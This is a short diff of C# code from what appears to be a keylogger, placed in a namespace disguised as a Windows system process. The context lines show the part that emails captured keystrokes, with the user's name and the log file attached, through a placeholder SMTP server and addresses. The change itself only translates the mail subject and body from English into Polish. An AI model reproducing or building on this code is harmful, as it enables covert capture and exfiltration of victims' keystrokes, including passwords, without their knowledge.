@@ -100,8 +100,8 @@ namespace Windows® Data Handler Process
                 SmtpClient SmtpServer = new SmtpClient("smtp.domena.com");
                 mail.From = new MailAddress("nadawca@domena.com");
                 mail.To.Add("odbiorca@domena.com");
-                mail.Subject = "Saved keys from " + date;
-                mail.Body = "Keystrokes saved from user " + user;
+                mail.Subject = "Zapisane klawisze " + date;
+                mail.Body = "Zapisane klawisze z user " + user;
 
                 Attachment attachment;
                 attachment = new Attachment(fPath);
